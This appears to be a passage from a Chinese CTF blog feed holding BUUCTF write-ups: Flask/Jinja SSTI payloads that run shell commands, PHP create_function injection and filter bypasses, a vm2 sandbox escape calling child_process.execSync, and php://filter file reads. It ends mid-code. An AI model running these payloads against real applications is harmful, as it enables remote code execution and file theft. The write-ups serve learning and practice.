<p><a href="https://www.freebuf.com/sectool/200175.html">https://www.freebuf.com/sectool/200175.html</a></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210708141802.png" alt="img" style="zoom:67%;">

<p><a href="https://www.freebuf.com/sectool/200175.html">https://www.freebuf.com/sectool/200175.html</a></p>
<p>扫出注入名为name，接下来直接构造注入语句进行注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&#123;&#123;%22%22.__class__.__base__.__subclasses__()[222](&#39;cat &#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.txt&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>其中也有遇到一个难点，就是找不到flag，越是先使用了find -name “flag*”找了一下flag，发现是flag.txt，但依旧不知道路径，于是翻了一下linux重要目录，使用/proc/self/cwd/列出了当前运行进程工作目录：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210708135709.png" alt="img"></p>
<p>但是还是没有完整路径，这里就猜想了一下，这个路径能不能直接访问呢？</p>
<p><strong>没想到居然是可以的</strong><br>所以就有了以上payload</p>
<h3 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h3><p>可以通过/proc/self/cwd/直接cat到当前工作进程的文件<br>例如/proc/self/cwd/flag.txt 就可以直接cat到此flag而不需要去寻找flag的绝对路径</p>
<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line">$shana = $_GET[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">$arg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$code = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, $_GET[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, $code) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    $code(<span class="string">&#x27;&#x27;</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>真好，又忘记保存博客了。</p>
<h3 id="绕过小结"><a href="#绕过小结" class="headerlink" title="绕过小结"></a>绕过小结</h3><p>1.<code>$_SERVER[&#39;QUERY_STRING&#39;]绕过</code><br>$_SERVER[‘QUERY_STRING’]接受数据是不会进行解码的，所以我们直接将传入的内容进行url编码即可</p>
<p>2.<code>preg_match绕过</code><br>正则匹配使用%0Aj进行换行操作即可绕过</p>
<p>3.<code>REQUEST值匹配绕过</code><br>由于post的优先级高于get，所以我们只要传一个post值就可以，当然是要数字</p>
<p>4.<code>file_get_contents绕过</code><br>我们知道file_get_contents是从文本中读取内容，那么这里就需要使用php的伪协议了，使用data即可格式为data:text/plain;+文本</p>
<p>5.<code>sha绕过使用数组进行绕过即可</code><br>就传入数组就行</p>
<p>但是很奇怪 当我在绕过第三个的时候发现就出问题了，，在本地尝试也是可以绕过的，但是到了buu上面就是绕不过？<br>看了一下wp 考点在于后面create_function的构建，于是就直接来学学吧</p>
<h3 id="create-function的使用"><a href="#create-function的使用" class="headerlink" title="create_function的使用"></a>create_function的使用</h3><h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h4><p>适用范围：<code>PHP 4&gt; = 4.0.1</code>，<code>PHP 5</code>，<code>PHP 7</code></p>
<p>功能：根据传递的参数创建匿名函数，并为其返回唯一名称。</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create_function(string $args,string $code)</span><br><span class="line">string $args 声明的函数变量部分</span><br><span class="line"></span><br><span class="line">string $code 执行的方法代码部分</span><br></pre></td></tr></table></figure>

<h4 id="2-功能分析案例"><a href="#2-功能分析案例" class="headerlink" title="2.功能分析案例"></a>2.功能分析案例</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$newfunc = create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;New anonymous function: <span class="subst">$newfunc</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $newfunc(<span class="number">2</span>, M_E) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210709112455.png" alt="img"></p>
<h4 id="3-执行原理分析"><a href="#3-执行原理分析" class="headerlink" title="3.执行原理分析"></a>3.执行原理分析</h4><p>create_funtion()会创建一个匿名函数（lambda样式）。此处创建了一个lambda_1的函数，在第一个echo中显示出名字，并在第二个echo语句中执行了此函数</p>
<p>create_function()函数会在内部执行eval()，我们发现是执行了后面的return语句，属于create_function()中的第二个参数string$code位置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda_1</span>(<span class="params">$a, $b</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-本题利用详解"><a href="#4-本题利用详解" class="headerlink" title="4.本题利用详解"></a>4.本题利用详解</h4><p>本题利用点在这里:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$code(&#39;&#39;, $arg); </span><br></pre></td></tr></table></figure>

<p>第一个参数为空，第二个为可控参数，所以我们需要构造注入语句，看下$arg来自哪里。。逛了一圈，发现哪里都没有发现了extract() 函数</p>
<p><code>extract() 函数</code><br>从数组中将变量导入到当前的符号表。 该函数使用数组键名作为变量名，使用数组键值作为变量值。 针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 该函数返回成功设置的变量数目。</p>
<p>所以我们就利用这个flag来改变arg的值<br>首先，构造出来的语句要具有变成下面这样:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function a&#123;</span><br><span class="line">	return $a;</span><br><span class="line">&#125;</span><br><span class="line">xxx;&#x2F;&#x2F;&#125;</span><br></pre></td></tr></table></figure>

<p>翻译成我们的注入语句即为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;flag[arg]&#x3D;&#125;a();&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function</span><br></pre></td></tr></table></figure>

<p>而这个a后面的函数我们还有待构建就是了。。<br>接下的难点是<br>1.无法使用system()等函数执行系统命令，过滤了flag等关键字，过滤了print等关键字<br>但是,在这里还包含了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    $code(<span class="string">&#x27;&#x27;</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这里的这个思路就很奇妙了<br><strong>包含了这个文件，代表可以使用里面的变量，所以要想办法在不指定变量名称的情况下输出变量的值——get_defined_vars()函数用来输出所有的变量和值</strong></p>
<p>所以使用的payload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function</span><br></pre></td></tr></table></figure>

<p>但是此时只能获取到假的flag，继续构造:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;flag[arg]&#x3D;&#125;require(base64_decode(MWZsYWcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function</span><br></pre></td></tr></table></figure>

<p>由于环境受限没法复现完全，但是看了师傅们的文章感觉视野开拓了不少</p>
<h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><h4 id="1取反-异或绕过-伪协议读源码"><a href="#1取反-异或绕过-伪协议读源码" class="headerlink" title="1取反/异或绕过+伪协议读源码"></a>1取反/异或绕过+伪协议读源码</h4><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%CE%99%93%9E%98%D1%8F%97%8F));&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>中间的取反结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;1flag.php</span><br></pre></td></tr></table></figure>

<p><a href="https://www.gem-love.com/ctf/770.html#%E8%80%83%E7%82%B96%EF%BC%8Ccreatefunction()%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5">https://www.gem-love.com/ctf/770.html#%E8%80%83%E7%82%B96%EF%BC%8Ccreatefunction()%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5</a></p>
<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>这题很可惜，似乎是环境出了点问题所以没办法做到最后一步，但是也收获了很多，尤其是最后文件包含的思路，眼前一亮，以及非预期解让我懂得了其实字符过滤，异或取反操作往往会有不一般的收获，</p>
]]></content>
  </entry>
  <entry>
    <title>python urllib库学习</title>
    <url>/2021/07/10/python-urllib%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h2><p>原来这个和request这个库是同类型的库，它具有以下子模块，包括：<br>1.urllib.request打开后读取url内容<br>2.urllib.error包含由urllib.request抛出的异常类<br>3.urllib.parse解析url<br>4.urllib.robotparser解析robots.txt files</p>
]]></content>
  </entry>
  <entry>
    <title>buuctf21</title>
    <url>/2021/07/10/buuctf21/</url>
    <content><![CDATA[<h2 id="CISCN2019-华东南区-Double-Secret"><a href="#CISCN2019-华东南区-Double-Secret" class="headerlink" title="[CISCN2019 华东南区]Double Secret"></a>[CISCN2019 华东南区]Double Secret</h2><p>猜出目录是secret，然后参数也是secret<br>接下来输入参数发现每次参数的回显是不一样，像是有某种加密发现输入的字符比较多的时候就会报错了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(secret&#x3D;&#x3D;None):</span><br><span class="line">    return &#39;Tell me your secret.I will encrypt it so others can\&#39;t see&#39;</span><br><span class="line">rc&#x3D;rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密</span><br><span class="line">deS&#x3D;rc.do_crypt(secret)</span><br><span class="line"> </span><br><span class="line">a&#x3D;render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line">if &#39;ciscn&#39; in a.lower():</span><br><span class="line">    return &#39;flag detected!&#39;</span><br><span class="line">return a</span><br></pre></td></tr></table></figure>

<p>感觉这是其中一个比较有用的信息，涉及了解密内容</p>
<p>注意关键点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;render_template_string()函数说明可以渲染我们输入的参数，也就是说存在ssti注入</span><br></pre></td></tr></table></figure>

<p>所以接下来的关键是利用rc4加密的密文，将我们的payload进行加密后输入，接下来就会自动进行解密，就会执行我们的payload了~</p>
<p>网上找的加密脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key=<span class="string">&quot;init_key&quot;</span>,message=<span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    s_box=rc4_init_sbox(key)</span><br><span class="line">    crypt=str(rc4_excrypt(message,s_box))</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box=list(range(<span class="number">256</span>))</span><br><span class="line">    j=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j=(j+s_box[i]+ord(key[i%len(key)]))%<span class="number">256</span></span><br><span class="line">        s_box[i],s_box[j]=s_box[j],s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain,box</span>):</span></span><br><span class="line">    res=[]</span><br><span class="line">    i=j=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">        j=(j+box[i])%<span class="number">256</span></span><br><span class="line">        box[i],box[j]=box[j],box[i]</span><br><span class="line">        t=(box[i]+box[j])%<span class="number">256</span></span><br><span class="line">        k=box[t]</span><br><span class="line">        res.append(chr(ord(s)^k))</span><br><span class="line">    cipher=<span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span>(str(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">key=<span class="string">&quot;HereIsTreasure&quot;</span></span><br><span class="line">message=input(<span class="string">&quot;请输入明文:\n&quot;</span>)</span><br><span class="line">enc_base64=rc4_main(key,message)</span><br><span class="line">enc_init=str(base64.b64decode(enc_base64),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url=parse.quote(enc_init)</span><br><span class="line">print(<span class="string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)</span><br></pre></td></tr></table></figure>

<p>用手打了一次，还是学到了些东西的<br>然后输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls &#x2F;&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>即可查看到目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat flag.txt&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p>下面有提示 让我们到run.php里面输出code于是——<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210713090257.png" alt="img"></p>
<p>以为是ssti注入所以输了点内容，发现后面出了这玩意？<br><code>error.stack</code> 属性是一个字符串，描述代码中 <code>Error</code> 被实例化的位置<br>输入Error().stack<br>得到:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (&#x2F;app&#x2F;node_modules&#x2F;vm2&#x2F;lib&#x2F;main.js:219:62) at &#x2F;app&#x2F;server.js:51:33 at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5) at next (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13) at Route.dispatch (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3) at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5) at &#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22 at Function.process_params (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br></pre></td></tr></table></figure>

<p>可以发现是一个js的vm沙盒<br>直接找原型利用链来打就行</p>
<p>最新的沙箱逃逸的poc。<br> <a href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="string">&#x27;(&#x27;</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是因为有过滤，所以需要绕过，可以加上反引号进行绕过:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;run.php?code&#x3D;(()&#x3D;%3E&#123;%20TypeError[[&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;t&#96;,&#96;o&#96;,&#96;t&#96;,&#96;y&#96;,&#96;p&#96;,&#96;e&#96;][&#96;join&#96;](&#96;&#96;)][&#96;a&#96;]%20&#x3D;%20f&#x3D;%3Ef[[&#96;c&#96;,&#96;o&#96;,&#96;n&#96;,&#96;s&#96;,&#96;t&#96;,&#96;r&#96;,&#96;u&#96;,&#96;c&#96;,&#96;t&#96;,&#96;o&#96;,&#96;r&#96;][&#96;join&#96;](&#96;&#96;)]([&#96;r&#96;,&#96;e&#96;,&#96;t&#96;,&#96;u&#96;,&#96;r&#96;,&#96;n&#96;,&#96;%20&#96;,&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;c&#96;,&#96;e&#96;,&#96;s&#96;,&#96;s&#96;][&#96;join&#96;](&#96;&#96;))();%20try&#123;%20Object[&#96;preventExtensions&#96;](Buffer[&#96;from&#96;](&#96;&#96;))[&#96;a&#96;]%20&#x3D;%201;%20&#125;catch(e)&#123;%20return%20e[&#96;a&#96;](()&#x3D;%3E&#123;&#125;)[&#96;mainModule&#96;][[&#96;r&#96;,&#96;e&#96;,&#96;q&#96;,&#96;u&#96;,&#96;i&#96;,&#96;r&#96;,&#96;e&#96;][&#96;join&#96;](&#96;&#96;)]([&#96;c&#96;,&#96;h&#96;,&#96;i&#96;,&#96;l&#96;,&#96;d&#96;,&#96;_&#96;,&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;c&#96;,&#96;e&#96;,&#96;s&#96;,&#96;s&#96;][&#96;join&#96;](&#96;&#96;))[[&#96;e&#96;,&#96;x&#96;,&#96;e&#96;,&#96;c&#96;,&#96;S&#96;,&#96;y&#96;,&#96;n&#96;,&#96;c&#96;][&#96;join&#96;](&#96;&#96;)](&#96;cat+%2fflag&#96;)[&#96;toString&#96;]();%20&#125;%20&#125;)()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>还有一种方式是将关键字（比如prototyp）改为：${${prototyp}e}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(function ()&#123; TypeError[&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;] &#x3D; f&#x3D;&gt;f[&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;return this.proces&#96;&#125;s&#96;&#125;&#96;)(); try&#123; Object.preventExtensions(Buffer.from(&#96;&#96;)).a &#x3D; 1; &#125;catch(e)&#123; return e[&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;](()&#x3D;&gt;&#123;&#125;).mainModule[&#96;$&#123;&#96;$&#123;&#96;requir&#96;&#125;e&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;child_proces&#96;&#125;s&#96;&#125;&#96;)[&#96;$&#123;&#96;$&#123;&#96;exe&#96;&#125;cSync&#96;&#125;&#96;](&#96;cat &#x2F;flag&#96;).toString(); &#125; &#125;)()</span><br></pre></td></tr></table></figure>

<h3 id="payload分析："><a href="#payload分析：" class="headerlink" title="payload分析："></a>payload分析：</h3><p>刚学node.js的沙箱逃逸啥也编不出来，于是就用payload来分析一下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="string">&#x27;(&#x27;</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考:</p>
<p><a href="https://tothemoon2019.github.io/2020/10/21/%E7%AC%AC%20%E4%BA%94%20%E5%91%A8%20write%20up%20%5B%5BHFCTF2020%5DJustEscape%20%5BBJDCTF2020%5DEasySearch%20HCTF-2018-Web-warmup%5D/">https://tothemoon2019.github.io/2020/10/21/%E7%AC%AC%20%E4%BA%94%20%E5%91%A8%20write%20up%20%5B%5BHFCTF2020%5DJustEscape%20%5BBJDCTF2020%5DEasySearch%20HCTF-2018-Web-warmup%5D/</a><br><a href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p>
<h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>查看源码，看到cookie 直接传pass</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210713164901.png" alt="img" style="zoom:67%;">

<p>然后进去，抓包才能看到其他信息<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210713165732.png" alt="img" style="zoom:67%;"></p>
<p>看到文件包含就要想到伪协议！：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flflflflag.php</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">           window.location.href=<span class="string">&quot;404.html&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_åºé¢äºº_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,$file))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span 